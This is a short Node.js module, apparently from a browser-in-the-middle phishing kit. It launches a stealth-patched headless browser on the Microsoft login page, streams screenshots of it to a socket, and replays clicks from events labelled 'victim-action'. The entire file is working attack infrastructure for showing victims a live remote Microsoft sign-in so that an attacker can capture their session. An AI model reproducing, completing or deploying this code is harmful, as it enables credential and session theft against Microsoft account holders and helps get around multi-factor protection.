const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    console.log(`[BROWSER] Launching for ${socket.id}`);
    let browser;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        // HEARTBEAT: Force frames every 1.2s to bypass navigation hangs
        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 30 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            } else {
                clearInterval(stream);
            }
        }, 1200);

        console.log(`[NAV] Navigating to Microsoft...`);
        // Non-blocking navigation
        page.goto('https://login.microsoftonline.com/').catch(e => console.error(e.message));

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
            } catch (err) { console.error(err.message); }
        });

        socket.on('disconnect', async () => {
            clearInterval(stream);
            if (browser) await browser.close();
            console.log(`[BROWSER] Closed for ${socket.id}`);
        });

    } catch (error) {
        console.error('[FATAL]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
